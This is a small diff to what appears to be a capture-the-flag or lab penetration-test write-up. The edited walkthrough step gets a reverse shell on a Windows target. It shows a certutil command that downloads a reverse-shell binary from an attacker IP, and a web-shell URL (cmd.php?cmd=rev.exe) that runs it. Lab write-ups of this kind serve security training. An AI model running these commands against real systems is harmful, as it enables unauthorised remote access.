@@ -485,7 +485,7 @@ Enumerated top 200 UDP ports:
 
 #### - Typed "certutil.exe -urlcache -split -f "http://192.168.49.114/rev.exe" to downoad the reverse shell binary to the target machine
 
-#### - Typed rev.exe to execute the reverse shell binary and received a shell back:
+#### - Typed http://192.168.49.114/cmd.php?cmd=rev.exe to execute the reverse shell binary and received a shell back:
 
 ![](Images/Pasted%20image%2020221020192820.png)
 
